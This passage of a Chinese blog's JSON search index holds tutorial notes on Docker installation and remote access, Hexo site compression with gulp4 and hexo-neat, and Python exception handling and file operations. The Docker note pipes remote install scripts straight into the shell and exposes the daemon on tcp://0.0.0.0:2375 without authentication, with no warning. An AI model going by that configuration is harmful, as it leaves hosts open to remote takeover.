后记本篇主要记录了爬虫的基本原理、urllib库和requests库的常见操作的学习与练习。Python网络爬虫学习持续更新中。。。。。。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"Python","slug":"编程开发/Python","permalink":"https://qwzf.github.io/categories/编程开发/Python/"}],"tags":[{"name":"网络爬虫","slug":"网络爬虫","permalink":"https://qwzf.github.io/tags/网络爬虫/"},{"name":"urllib库","slug":"urllib库","permalink":"https://qwzf.github.io/tags/urllib库/"},{"name":"requests库","slug":"requests库","permalink":"https://qwzf.github.io/tags/requests库/"}],"author":"qwzf"},{"title":"Docker学习笔记(一)-容器、镜像和客户端与守护进程","slug":"Docker学习笔记(一)-容器、镜像和客户端与守护进程","date":"2020-02-14T12:05:20.000Z","updated":"2020-08-01T15:55:59.565Z","comments":true,"path":"2020/02/14/Docker学习笔记(一)-容器、镜像和客户端与守护进程/","link":"","permalink":"https://qwzf.github.io/2020/02/14/Docker学习笔记(一)-容器、镜像和客户端与守护进程/","excerpt":"","text":"0x00 前言一直使用过docker，但并不是太了解，于是开始学习了解一下 0x01 docker简介1、什么是容器？ 一种虚拟化的方案 操作系统级别的虚拟化 只能运行相同或相似内核的操作系统 依赖于Linux内核特性: Namespace和Cgroups (Control Group) 2、容器技术有哪些优点？ 磁盘占用空间少 提供更多的服务能力和服务更多的用户 3、什么是Docker？Docker是能将应用程序自动部署到容器的开源引擎。使用Go语言编写(Go语言开源引擎) 项目地址基于Apache2.0开源授权协议发行 docker的特别之处：docker在虚拟化的容器执行环境中增加了一个应用部署引擎。该引擎目标提供一个轻量、快速的环境。方便从开发者环境-&gt;测试环境-&gt;生产环境4、Docker有哪些特点？(Docker的目标) 提供简单轻量的建模方式 职责的逻辑分离 快速高效的开发生命周期 鼓励使用面向服务的架构 5、Docker的使用场景 使用Docker容器开发、测试、部署服务 创建隔离的运行环境 搭建测试环境 构建多用户的平台即服务（PaaS）基础设施 提供软件即服务（SaaS）应用程序 高性能、超大规模的宿主机部署 6、Docker的基本组成 Docker Client 客户端Docker Daemon 守护进程Docker Image 镜像Docker Container 容器Docker Registry 仓库 1.Docker客户端/守护进程：（1）C/S架构（2）本地/远程2.Docker Image 镜像：（1）容器的基石（2）层叠的只读文件系统（3）联合加载(union mount)3.Docker Container 容器：（1）通过镜像启动（2）启动和执行阶段启动时，在镜像的最顶层加载一个读写文件系统(可写层)（3）写时复制4.Docker Registry 仓库：（1）公有：Docker Hub（2）私有：可自己架设 0x02 安装docker1、验证是否安装curl验证是否安装了curl which curl 如果没有安装则进行安装 sudo apt-get update sudo apt-get install curl 2、使用官方脚本自动安装dockercurl -fsSL https://get.docker.com/ubuntu/|sudo sh 或curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 3、通过版本库安装docker1.在Ubuntu中建立ce存储库（1）更新apt资源包 sudo apt-get update （2）安装软件包以允许apt通过HTTPS使用存储库 sudo apt-get install apt-transport-https ca-certificates curl software-properties-common （3）添加Docker的官方GPG密钥 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 可使用以下命令进行验证秘钥指纹 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 sudo apt-key fingerprint 0EBFCD88 （4）可选设定稳定存储库，可不设置，则自动使用(deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable) sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable&quot; 2.安装docker-ce并配置docker（1）更新apt资源包，并进行安装docker-ce sudo apt-get update sudo apt-get -y install docker-ce 注：如果需要安装特定版本，则使用以下命令获取可用的版本号，使用要安装的版本号进行安装 apt-cache madison docker-ce sudo apt-get install -y docker-ce=&lt;VERSION&gt; 例如：docker-ce=18.03.0~ce-0~ubuntu （2）基础安装完成，可以先进行测试一下是否可用 sudo docker version sudo docker run hello-world 4、配置与卸载docker1.配置docker（1）省略sudo命令(感觉sudo麻烦的，可以执行这一步)如果执行时不想使用sudo命令，可以进行设置用户组，并将当前用户增加到该组中 sudo groupadd docker sudo usermod -aG docker $USER 注销一下，再执行以下命令 docker run hello-world （2）添加阿里云docker加速器和ip修改(不是必须的) { &quot;registry-mirrors&quot;: [&quot;https://(yourid).mirror.aliyuncs.com&quot;], &quot;bip&quot;:&quot;192.168.1.1/24&quot; } 2.卸载docker（1）卸载docker-ce sudo apt-get purge docker-ce （2）删除镜像、容器、卷 sudo rm -rf /var/lib/docker 0x03 docker容器1、容器的基本操作1.启动容器 docker run IMAGE [COMMAND][ARG..] #IMAGE启动容器所用镜像 #COMMAND和ARG容器启动后运行的命令和参数 如：输出Hello World root@qwzf:~# docker run ubuntu echo &#39;Hello World&#39; Hello World 2.启动交互式容器 docker run -i -t IMAGE /bin/bash #-i 始终打开标准输入 --interactive=true|false 默认false #-t 为创建的容器分配一个伪tty终端 --tty=true|false 默认是false 如： root@qwzf:~# docker run -i -t ubuntu /bin/bash root@c12aa40c4376:/# 3.查看容器 docker ps [-a][-l] #没有参数时，列出正在运行的容器 #-a 列出所有容器 #-l 列出最新创建的容器 查看已经建立起的容器 docker inspect id/容器名 4.自定义容器名 docker run --name=自定义名 -i -t IMAGE /bin/bash 5.重新启动停止的容器 docker start [-i] id/容器名 #-i可以以交互的方式来重新启动 6.删除停止的容器 docker rm id/容器名 2、守护式容器1.什么是守护式容器 长期运行 没有交互式会话 适合运行应用程序和服务 2.以守护形式运行容器 运行： docker run -i -t IMAGE /bin/bash 退出交互式bash(这样容器就会在后台运行): Ctrl+P Ctrl+Q 3.附加到运行中的容器(再次进入容器) docker attach id/容器名 4.启动守护式容器 docker run -d IMAGE [COMMAND][ARG..] #-d 启用容器时使用后台的方式执行命令 5.查看容器日志 docker logs [-f][-t][--tail] 容器名 #-f 一直跟踪logs变化并返回结果 --folloes=true|false 默认false #-t 在返回的结果上加上时间戳 --timestamps=true|false 默认false #--tail 返回结尾处多少数量的日志 默认--tail=&quot;all&quot; 如：显示最新的日志 root@qwzf:~# docker logs -tf --tail 0 容器名 6.查看容器内进程 docker top 容器名 7.在运行中的容器内启动新进程 docker exec [-d][-i][-t] 容器名 [COMMAND][ARG..] 如： docker exec -i -t c12aa40c4376 /bin/bash 退出：Ctrl+P Ctrl+Q 查看：docker top c12aa40c4376 8.停止守护式容器 docker stop 容器名 #发送一个信号给容器，等待容器的停止 docker kill 容器名 #直接停止容器 0x04 docker镜像存储位置：/var/lib/docker查看存储驱动和存储位置：docker info 1、查看和删除镜像1.列出镜像 docker images [选项] [REPOSITORY] #-a 显示所有镜像,默认不显示中间层镜像,--all=false #-f 显示时的过滤条件,--filter=[] #--no-trunc 不使用截断的方式显示数据 #-q 只显示镜像的唯一d,--quiet=false 2.镜像标签和仓库（1）镜像的仓库 REPOSITORYREPOSITORY 仓库：一系列镜像的集合REGISTRY 仓库：docker镜像的存储服务（2）镜像标签 TAG不同镜像以标签进行区分仓库名+标签名-&gt;镜像名 对应一个镜像的id ubuntu:14.04 ubuntu:latest 默认 3.查看镜像 docker inspect [OPTIONS] CONTAINER|IMAGE [CONTAINER|IMAGE...] #-f,--format=&quot;&quot; 如：docker inspet ubuntu:14.04 4.删除镜像 docker rmi [OPTIONS] IMAGE [IMAGE...] #-f 强制删除镜像 #--no-prune 保留被打标签的父镜像 如： 删除单个：docker rmi 镜像id 删除多个：docker ubuntu:12.04 ubuntu:14.04 删除对应的所有镜像： docker rmi $(docker images -q ubuntu) 2、获取和推送镜像1.查找镜像（1）Docker Hub（2）docker search [OPTIONS] TERM –automated 自动化，只会显示自动化构建的镜像–no-trunc 不使用截断的方式显示数据-s,–stars=0 限制显示的最低星级 docker search -s 3 ubuntu 2.拉取镜像 docker pull [OPTIONS] NAME [:TAG] #-a 匹配并下载所有标记的镜像 如：docker pull ubuntu:14.04 3.推送镜像 docker push NAME[:TAG] 3、构建镜像 保存对容器的修改，并再次使用 自定义镜像的能力 以软件的形式打包并分发服务及其运行环境 docker commit 通过容器构建 docker build 通过Dockerfile文件构建 1.使用commit构建镜像 docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]] #-a 指定镜像作者 #-m 记录镜像构建信息 #-p 不暂停正在运行的容器 如： docker commit -a &#39;qwzf&#39; -m &#39;nginx&#39; 容器名 qwzf/test1(qwzf/test1 可以随便填) 2.使用Dockerfile构建镜像Dockerfile文件：包含一切命令的文本文件（1）创建Dockerfile #First Dockerfile FROM ubuntu:14.04 MAINTAINER qwzf &quot;注册邮箱&quot; RUN apt-get update RUN apt-get install -y nginx EXPOSE 80 （2）适用docker build 命令 docker build [OPTIONS] PATH |URL|- #--force-rm #--no-cache #--pull #-q #--rm=true #-t,tags=&quot;&quot; 指定构建出镜像的名字 如：docker build -t=&#39;qwzf/test2&#39; 每执行一步返回唯一id，即中间层镜像 0x05 docker其他操作1、docker客户端与守护进程1.docker与守护进程的通信方式Remote API(某些情况下支持STDIN、STDOUT、STDERR)2.docker与守护进程的连接方式通过socket进行连接，docker提供的三种模式： unix:///var/run/docker.sock #默认 tcp://host:port fd://socketfd 使用docker命令行操作，就是在客户端进行操作的。3.查看是否运行docker守护进程 ps -ef | grep docker 4.测试Remote API nc -U /var/run/docker.sock #连接socket #发出指令，查看Remote API的一个接口。执行产生docker通过Remote API返回的结果 GET /info HTTP/1.0 5.使用service命令管理 service docker start service docker stop service docker restart 6.启动配置文件：docker1.12版本以前/etc/default/docker，现在是/etc/docker/daemon.json7.docker的远程访问docker的远程访问：docker客户端和守护进程配置到不同的机器上（1）准备：1）两台安装docker的服务器2）修改docker守护进程启动选项，区别服务器docker1.12之后docker建议在/etc/docker/daemon.json文件中修改docker启动参数,而不再是修改vim /etc/default/docker的DOCKER_OPTS参数 vim /etc/docker/daemon.json { &quot;registry-mirrors&quot;: [&quot;https://(阿里加速器id).mirror.aliyuncs.com&quot;], &quot;labels&quot;: [&quot;name=docker_server_1&quot;] } 重启docker service docker restart 查看是否修改成功 docker info 参考：使用本地的docker客户端连接远程docker的守护进程 #1.12版之前 #vim /etc/default/docker #服务端：DOCKER_OPTS=&quot;--label name=docker_server_1&quot; #客户端：DOCKER_OPTS=&quot;--label name=docker_server_2&quot; 3）保证Client API和Server API版本一致（2）修改服务器端配置同理，docker1.12之后的修改配置/etc/docker/daemon.json文件即可 设置客户端与守护进程的连接方式为：tcp://host:port vim /etc/docker/daemon.json { &quot;registry-mirrors&quot;: [&quot;https://kf0vxqi6.mirror.aliyuncs.com&quot;], &quot;labels&quot;: [&quot;name=docker_server_1&quot;], &quot;hosts&quot;: [&quot;tcp://0.0.0.0:2375&quot;] } #1.12版本前 #DOCKER_OPTS=&quot;--label name=docker_server_1 -H tcp://0.0.0.0:2375&quot; 重启docker service docker restart 查看是否运行docker守护进程 ps -ef | grep docker 测试服务器端docker客户端连接本机守护进程本机直接docker info连接守护进程测试，会显示不支持本地连接(一般使用方法二解决) 方法一：可使用配置环境变量或使用-H选项进行连接，参考下面客户端机器连接本机的守护进程的方式 方法二：也可以在启动选项上添加默认连接方式unix:///var/run/docker.sock vim /etc/docker/daemon.json { &quot;registry-mirrors&quot;: [&quot;https://kf0vxqi6.mirror.aliyuncs.com&quot;], &quot;labels&quot;: [&quot;name=docker_server_1&quot;], &quot;hosts&quot;: [ &quot;tcp://0.0.0.0:2375&quot;, &quot;unix:///var/run/docker.sock&quot; ] } #1.12版之前 #DOCKER_OPTS=&quot;--label name=docker_server_1 -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock&quot; 然后重启docker即可 （3）在客户端操作与修改客户端配置1）在客户端操作实现远程访问 测试能否成功访问到 curl http://192.168.201.128:2375/info 实现客户端的远程访问 docker -H tcp://192.168.201.128:2375 info 2）修改客户端配置实现远程访问使用环境变量 DOCKER_HOST，不用重复使用-H选项实现远程访问 export DOCKER_HOST=&quot;tcp://192.168.201.128:2375&quot; 运行docker info命令测试 调回连接本机的docker守护进程，只需将环境变量置空 export DOCKER_HOST=&quot;&quot; #这样docker又会使用默认的连接方式：unix:///var/run/docker.sock 具体实现过程可参考：使用本地的docker客户端连接远程docker的守护进程Docker远程访问 0x06 后记暂时就先学这么多吧！本次学习Docker我学习了docker的安装、docker容器和docker镜像的一些操作，docker客户端与守护进程。总的来说，收获很大，继续努力！！！","categories":[{"name":"运维","slug":"运维","permalink":"https://qwzf.github.io/categories/运维/"},{"name":"Docker","slug":"运维/Docker","permalink":"https://qwzf.github.io/categories/运维/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://qwzf.github.io/tags/Docker/"},{"name":"容器","slug":"容器","permalink":"https://qwzf.github.io/tags/容器/"},{"name":"镜像","slug":"镜像","permalink":"https://qwzf.github.io/tags/镜像/"},{"name":"客户端与守护进程","slug":"客户端与守护进程","permalink":"https://qwzf.github.io/tags/客户端与守护进程/"}],"author":"qwzf"},{"title":"Hexo速度优化及遇到的问题(gulp4、hexo-neat)","slug":"Hexo速度优化及遇到的问题(gulp4、hexo-neat)","date":"2020-02-07T16:24:25.000Z","updated":"2020-08-01T16:03:04.416Z","comments":true,"path":"2020/02/08/Hexo速度优化及遇到的问题(gulp4、hexo-neat)/","link":"","permalink":"https://qwzf.github.io/2020/02/08/Hexo速度优化及遇到的问题(gulp4、hexo-neat)/","excerpt":"","text":"0x00 前言这几天闲来无事，学习了下Hexo的博客速度优化，发现有好多方法。CDN加速、Coding部署、gulp压缩、hexo-neat、InstantClick 黑科技等等。这里记录下我使用gulp压缩进行Hexo速度优化和在此过程中遇到的问题，以及使用hexo-neat对Hexo进行速度优化。这两种方法都是静态文件压缩，静态文件包括: html,css,js,images 0x01 优化之前在博客速度优化之前，先来说说在浏览器输入url到页面打开，都做了些什么？，因为没怎么了解过，所以参考了很多博客，具体参考的博客链接在文末。当在浏览器地址栏输入网址，如：www.baidu.com后浏览器是怎么把最终的页面呈现出来的呢？这个过程可以大致分为两个部分：网络通信和页面渲染。 1、大致流程URL 解析-&gt;DNS 查询-&gt;TCP 连接-&gt;处理请求-&gt;接受响应-&gt;渲染页面简单的来说，就是： 浏览器里输入网址 浏览器查找域名对应的IP地址DNS具体的查找过程，包括：浏览器缓存-&gt;系统缓存-&gt;路由器缓存-&gt;ISP DNS缓存-&gt;根域名服务器 浏览器向web服务器发送一个HTTP请求 服务器的永久重定向响应（从http://baidu.com 到 http://www.baidu.com） 为什么要重定向？其中一个原因跟搜索引擎排名有关。如果一个页面有两个地址，就像http://baidu.com/和http://www.baidu.com/，搜索引擎会认为它们是两个网站，结果造成每一个的搜索链接都减少从而降低排名。所以要把带www的和不带www的地址归到同一个网站排名下。还有一个原因是用不同的地址会造成缓存友好性变差。 浏览器跟踪重定向地址，发起GET请求 服务器”处理”请求，向浏览器发回一个HTML响应 浏览器解析显示HTML 浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS等等） 浏览器发送异步请求（ajax请求等） 2、简单分析从上面的过程可以看出，大部分过程我们无法控制，所以只能从浏览器端入手来找一些可以做的事情。少发送请求 把要加载的js文件（css文件同理）合并成一个（尽量少）文件，则可以向服务器少发送请求，从而减少等待时间。 压缩文件 使用压缩之后的js、css、img文件，同样可以减少请求时间。 Css Sprite 这是css的一项技术，将图片尽可能多的合并成一个图片文件，第一次使用的时候加载这张图片，然后浏览器会缓存下来，其他地方再使用的时候就不需要重新请求了。 js／css位置 css引用建议放在head标签里面；js脚本建议放到body内容的最后，原因：等待js加载或者脚本有错误的时候不会影响html页面的展示。 那么怎么提高hexo这个静态博客的页面加载速度呢？可以从以下的几个方面去入手： 将js文件尽可能放到body的闭合标签之前，因为在加载或者引入js文件时是阻塞式的，如果在页面的最开始就引入这些js文件，而这些文件又比较大，会造成页面在渲染时长时间处于白屏状态。 尽量避免去引用访问速度非常低下的cdn或者图片，可改用访问速度更快的cdn，或将难以迅速加载的图片保存到自己的站点目录下，以免在加载图片时耗费大量时间，最后还加载失败。 对页面的静态资源进行压缩，包括css、js和html等文件。 我们自己添加的css和js文件为了可读性，往往会有很多换行和空格，这些对于浏览器来说并没什么用，甚至还会降低渲染页面的速度。至于html文件，由于Markdown转成html的bug，会导致页面存在大量的空白，查看下页面的源代码，会发现有大量的空白符，这也会造成页面渲染的性能问题。 0x02 gulp4压缩静态文件1、安装gulp在站点根目录下安装1.安装gulp工具 npm install gulp -g 2.安装gulp插件 npm install gulp-minify-html gulp-minify-css gulp-uglify gulp-imagemin --save # 解决【Gulp打包问题】 GulpUglifyError: unable to minify JavaScript # 解决 gulp-uglify 压缩JavaScript 不兼容 es5 语法的问题 #npm install babel-core@6.26.3 --save #npm install gulp-babel@7.0.1 --save #npm install babel-preset-es2015@6.24.1 --save # gulp-babel 取消严格模式方法(&quot;use strict&quot;) #npm install gulp-remove-use-strict --save #问题：如果安装gulp-imagemin错误请执行以下语句 #sudo npm i gulp-imagemin --unsafe-perms 2、建立gulpfile.js文件在站点根目录下创建gulpfile.js var gulp = require(&#39;gulp&#39;); //Plugins模块获取 var minifycss = require(&#39;gulp-minify-css&#39;); var uglify = require(&#39;gulp-uglify&#39;); var minifyhtml = require(&#39;gulp-minify-html&#39;); // 压缩 public 目录 css文件 gulp.task(&#39;minify-css&#39;, function () { return gulp.src(&#39;./public/**/*.css&#39;) .pipe(minifycss()) .pipe(gulp.dest(&#39;./public&#39;)); }); // 压缩 public 目录 html文件 gulp.task(&#39;minify-html&#39;, function () { return gulp.src(&#39;./public/**/*.html&#39;) .pipe(minifyhtml()) .pipe(gulp.dest(&#39;./public&#39;)) }); // 压缩 public/js 目录 js文件，忽略/public/lib/blog-encrypt.js gulp.task(&#39;minify-js&#39;, function () { //纠错前：return gulp.src(&#39;./public/**/*.js&#39;) return gulp.src([&#39;./public/**/*.js&#39;, &#39;!./public/lib/blog-encrypt.js&#39;]) .pipe(uglify()) .pipe(gulp.dest(&#39;./public&#39;)) }); // 压缩图片 //gulp.task(&#39;minify-images&#39;, function() { // return gulp.src(&#39;./public/images/**/*.*&#39;) // .pipe(imagemin( // [imagemin.gifsicle({&#39;optimizationLevel&#39;: 3}), // imagemin.jpegtran({&#39;progressive&#39;: true}), // imagemin.optipng({&#39;optimizationLevel&#39;: 7}), // imagemin.svgo()], // {&#39;verbose&#39;: true})) // .pipe(gulp.dest(&#39;./public/images&#39;)) //}); //因为我图片用的第三方图床存放的，所以就没压缩图片。(并且最后测试压缩图片时，发现有点权限问题， //整了两个多小时没整好！@^@) // 分别执行css、heml、js的压缩任务 gulp.task(&#39;default&#39;, gulp.parallel(&#39;minify-css&#39;, &#39;minify-html&#39;, &#39;minify-js&#39;)); 注：1.修改上面的各个目录为你的真实目录， ** 代表0或多个子目录2.在默认任务中，gulp.parallel()是gulp4中的新写法：gulp.series 用于串行(顺序)执行gulp.parallel 用于并行执行3.部署执行 hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d 感觉命令有点多，也可以直接在package.json文件里添加 &quot;scripts&quot;: { &quot;hexo&quot;: &quot;hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d&quot; }, 然后在博客根目录执行npm run hexo即可 3、遇到的问题在使用gup4压缩静态文件时遇到一些问题，总结一下：1.gulp4的默认任务执行问题 //4.0以前的写法 //gulp.task(&#39;default&#39;, [&#39;minify-html&#39;, &#39;minify-css&#39;, &#39;minify-js&#39;]); //4.0以后的写法 // 执行 gulp 命令时执行的任务 gulp.task(&#39;default&#39;, gulp.parallel(&#39;minify-css&#39;, &#39;minify-html&#39;, &#39;minify-js&#39;)); 2.TypeError: dest.on is not a function先检查gulpfile.js若没有问题，删掉node_modules，重装一遍依赖npm install 3.GulpUglifyError: unable to minify JavaScript(Gulp打包问题)错误原因有很多，如：有的文件不能打包、javascirpt语法问题等等。我遇到的问题是有的文件不能打包。（1）解决方法1：检查哪一个文件中的哪一行有问题，安装 gulp-util 模块 用于打印日志 npm install --save-dev gulp-util 在gulpfile.js里添加： gulp.task(&#39;script&#39;, function() { gulp.src([&#39;public/**/*.js&#39;, &#39;public/lib/**/*.js&#39;]) .pipe(uglify()) .on(&#39;error&#39;, function(err) { gutil.log(gutil.colors.red(&#39;[Error]&#39;), err.toString()); }) .pipe(&#39;dist/js&#39;) }) 执行gulp script，这样就可以精准的逐个排查文件了。这里我排查到：发现blog-encrypt.js有问题，在gulpfile.js忽略blog-encrypt.js即可，即 // 压缩 public/js 目录 js文件 gulp.task(&#39;minify-js&#39;, function () { //纠错前：return gulp.src(&#39;./public/**/*.js&#39;) return gulp.src([&#39;./public/**/*.js&#39;, &#39;!./public/lib/blog-encrypt.js&#39;]) .pipe(uglify()) .pipe(gulp.dest(&#39;./public&#39;)) }); （2）解决方法2：继续方法1 安装 babel 模块gulp-babel、babel-preset-es2015 npm install --save-dev gulp-babel babel-preset-es2015 gulp.task(&#39;script&#39;, function() { gulp.src([&#39;public/**/*.js&#39;, &#39;public/lib/**/*.js&#39;]) .pipe(babel({ presets: [&#39;es2015&#39;] // es5检查机制 })) .pipe(uglify()) .on(&#39;error&#39;, function(err) { gutil.log(gutil.colors.red(&#39;[Error]&#39;), err.toString()); }) .pipe(&#39;dist/js&#39;) }) 这样就解决 gulp-uglify 压缩JavaScript 不兼容 es5 语法的问题了。4.The following tasks did not complete: html Did you forget to signal async completion?运行gulp，出现下面报错： The following tasks did not complete: html Did you forget to signal async completion? 解决办法：在注册的任务函数里使用 async 和 await。 gulp.task(&quot;html&quot;,async()=&gt;{ await gulp.src(folder.src + &quot;html/*&quot;) .pipe(htmlClean()) .pipe(gulp.dest(folder.build + &quot;html&quot;)) }) gulp4安装使用过程中，我暂时就遇到上面这几种错误。除了上述错误，还有很多可能会出错的地方，这里有个博客记录了一些：gulp 错误集锦 0x03 hexo-neat压缩静态文件hexo-neat是由rozbo大佬开发的压缩插件，配置简单，无需额外命令，只要使用原本的调试三连或者部署三连就可以自动完成静态资源的压缩 1、安装hexo-neat在站点根目录下 npm install hexo-neat --save 2、添加相关配置在站点配置文件_config.yml添加相关配置，直接添加到站点配置文件_config.yml的末尾就可以。可以安装自己的需求去自定义配置，不过有些注意事项 # hexo-neat # 博文压缩 neat_enable: true # 压缩html neat_html: enable: true exclude: # 压缩css neat_css: enable: true exclude: - &#39;**/*.min.css&#39; # 压缩js neat_js: enable: true mangle: true output: compress: exclude: - &#39;**/*.min.js&#39; - &#39;**/jquery.fancybox.pack.js&#39; - &#39;**/index.js&#39; 3、hexo-neat插件注意事项在使用hexo-neat插件时，可以在命令窗口中看到各个文件的压缩率，于是可以通过跳过一些文件让效率更高。1.跳过压缩文件的正确配置方式如果按照官方插件的文档说明来配置exclude，会发现完全不起作用。这是因为配置的文件路径不对，压缩时找不到你配置的文件，自然也就无法跳过了。于是需要给这些文件指定正确的路径，万能的配置方式如下： neat_css: enable: true exclude: - &#39;**/*.min.css&#39; 2.压缩html时不要跳过.md文件和.swig文件.md文件就是markdown文件，如果跳过压缩.md文件，而又刚好在文章中使用到了tab标签，那么当hexo在生成静态页面时就会发生解析错误。这会导致使用到了tab标签的页面生成失败而无法访问。 .swig文件是模板引擎文件，也就是hexo可以通过这些文件来生成对应的页面。如果跳过这些文件，所有页面完全没有起到压缩的效果，页面源代码里依然存在着一大堆空白。 0x04 后记对Hexo进行简单的速度优化过程中，我主要学习了从输入url到页面打开的过程、使用gup4和hexo-neat进行速度优化，最好的速度优化方式应该是使用CDN加速，在下太穷，所以没使用。同时在使用gup4速度优化过程中也培养了自己的纠错改错的能力，继续加油！！！ 参考博客：在浏览器输入 URL 回车之后发生了什么（超详细版）从输入URL到页面加载的全过程从输入URL到页面加载的过程？如何由一道题完善自己的前端知识体系！从输入URL到浏览器显示页面发生了什么网络通信总结（TCP/IP协议、HTTP协议等） Hexo折腾记——性能优化篇加速 Hexo 博客基于Hexo搭建个人博客优化(五)—压缩篇(gulp4.0压缩静态资源)hexo博客进阶－性能优化hexo优化之——使用gulp压缩资源","categories":[{"name":"博客","slug":"博客","permalink":"https://qwzf.github.io/categories/博客/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://qwzf.github.io/tags/Hexo/"},{"name":"Hexo性能优化","slug":"Hexo性能优化","permalink":"https://qwzf.github.io/tags/Hexo性能优化/"}],"author":"qwzf"},{"title":"Python学习-基础篇(四)","slug":"Python学习-基础篇(四)","date":"2020-01-21T13:31:15.221Z","updated":"2020-08-01T15:49:46.445Z","comments":true,"path":"2020/01/21/Python学习-基础篇(四)/","link":"","permalink":"https://qwzf.github.io/2020/01/21/Python学习-基础篇(四)/","excerpt":"","text":"前言本篇包含：异常处理及程序调试、文件及目录操作、操作数据库 八、异常处理及程序调试Python 常见异常类型 1、异常处理语句1.try…except语句 try: 语句块1 except [ExceptionName [as alias]]: 语句块2 #ExceptionName指定要捕获的异常；不指定，处理所有异常 #出现异常，执行语块2 #处理多个异常：except (异常1,异常2) as alias: def chufa(): #除法 a = int(input(&quot;请输入被除数:&quot;)) b = int(input(&quot;请输入除数:&quot;)) print(a,&quot;除以&quot;,b,&quot;的结果为:&quot;,a/b) if __name__ == &#39;__main__&#39;: try: chufa() except ZeroDivisionError: print(&quot;\\n被除数不能为0！！！&quot;) 2.try…except…else语句 try: 语句块1 except [ExceptionName [as alias]]: 语句块2 else: 语句块3 #没有出现异常，执行语块3；出现异常不执行语块3 3.try…except…finally语句 try: 语句块1 except [ExceptionName [as alias]]: 语句块2 finally: 语句块3 #无论是否出现异常，都执行语块3 4.使用raise语句抛出异常某个方法或函数可能会产生异常，不想在当前的方法或函数处理异常，可以使用raise语句在方法或函数中抛出异常。 raise [ExceptionName[(reason)]] #reason异常信息描述 #省略[ExceptionName[(reason)]]会把异常原样抛出 #省略[(reason)]，异常不带描述信息 def chufa(): #除法 a = int(input(&quot;请输入被除数:&quot;)) b = int(input(&quot;请输入除数:&quot;)) if a &lt; b: raise ValueError(&quot;这里被除数要大于除数！&quot;) print(a,&quot;除以&quot;,b,&quot;的结果为:&quot;,a/b) if __name__ == &#39;__main__&#39;: chufa() 2、程序调试1.使用自带的IDLE进行程序调试IDLE-&gt;Debug-&gt;Debugger添加断点：在要添加断点的行-&gt;右键-&gt;Set Breakpoint使用 python IDLE 自带的 debuger 进行调试2.使用assert语句调试程序 assert expression [,reason] #expression 表达式为真时，什么都不做，表达式为假时，抛出AssertionError异常； #reason可选参数，用于对判断条件进行描述，为了以后更好的知道哪里出现了问题。 assert语句只在调试阶段有效.所以我们平时测试用的debug版本才会有断言挂起,release版本没有断言 apple=int(input(&quot;请输入苹果数量：&quot;)) children=int(input(&quot;请输入小朋友的数量：&quot;)) assert apple&gt;children,&quot;苹果不够分&quot; #结果 请输入苹果数量：10 请输入小朋友的数量：20 Traceback (most recent call last): File &quot;C:\\Python27\\main.py&quot;, line 9, in &lt;module&gt; assert apple&gt;children,&quot;苹果不够分&quot; AssertionError: 苹果不够分 注：（1）断言只能作为辅助调试手段使用，在表达式为False时抛出异常终止程序执行，不能在程序中代替条件判断语句，因为程序以优化方式运行时不会执行断言语句。（2）添加-O参数程序运行在优化模式，不会输出断言：python -O 文件名.py 九、文件及目录操作1、基本文件操作打开文件-&gt;写入内容-&gt;关闭文件打开文件-&gt;读取内容-&gt;(关闭文件,也可以不关闭)1.创建和打开文件 file = open(filename[,mode[,buffering]]) #mode文件打开模式：r只读、w只写、a追加 #buffering指定读写的缓存模式：0不缓存、1缓存、大于1缓冲区大小 file = open(&#39;qwzf.txt&#39;,&#39;w&#39;) #创建文件 file = open(&#39;qwzf.txt&#39;,&#39;r&#39;) #打开gbk文件 file = open(&#39;qwzf.txt&#39;,&#39;r&#39;,encoding = &quot;utf-8&quot;) #打开utf-8文件 file = open(&#39;qwzf.jpg&#39;,&#39;rb&#39;)#以二进制形式打开文件 2.关闭文件 file.close() 判断文件是否关闭：print(file.closed)3.打开文件时使用with语句使用with语句打开文件，可以自动关闭文件 with expression as target: with-body #expression可以指定要打开文件的open函数 #as target指定变量，target保存表达式的结果 #with-body语句体 with open(&#39;qwzf.txt&#39;,&#39;r&#39;,encoding = &quot;utf-8&quot;) as file: #打开文件 pass 4.写入文件内容 file.write(string) file = open(&#39;qwzf.txt&#39;,&#39;w&#39;,encoding = &quot;utf-8&quot;) #打开文件 file.write(&quot;我学Python&quot;) #写入内容 file.close() #关闭文件 如果不想关闭并把内容写入文件，可以使用file.flush() 把缓冲区内容写入文件将列表内容写入文件 list1 = [&quot;qwzf&quot;,&quot;lemon&quot;,&quot;chumen007&quot;] with open(&quot;qwzf.txt&quot;,&quot;w&quot;) as file: file.writelines([line + &quot;\\n&quot; for line in list1]) 5.读取文件文件打开模式只能是r(只读)或r+(读写)（1）读取指定字符：file.read([size])file.seek()将文件指针移到要截取的位置 with open(&quot;qwzf.txt&quot;,&quot;r&quot;) as file: #打开文件 print(&quot;文件内容:&quot;,file.read()) file.seek(10) #定位到第10个字节 string = file.read(2) #读取两个字符 print(string) （2）读取一行：file.readline() with open(&quot;qwzf.txt&quot;,&quot;r&quot;) as file: #打开文件 num = 0 #记录行号 while True: num += 1 line = file.readline() #读取一行 if line == &quot;&quot;: break print(num,line,end=&quot;\\n&quot;) #输出一行 （3）读取全部行：file.readlines()，返回字符串列表 2、目录操作1.os和os.path模块os模块是Python内置的与操作系统功能和文件系统相关的模块。该模块的语句的执行结果通常与操作系统有关。os.path模块是os模块的子模块python之OS模块详解python之os模块Python必学的OS模块详解2.路径os.getcwd()获取文件当前工作目录os.path.abspath(path)获取文件绝对路径os.path.join(path1[,path2[,...]])拼接路径path：路径 import os print(&quot;当前工作目录:&quot;,os.getcwd()) with open(&quot;test/qwzf.txt&quot;,&quot;r&quot;) as file: #通过相对路径打开文件 print(file.read()) 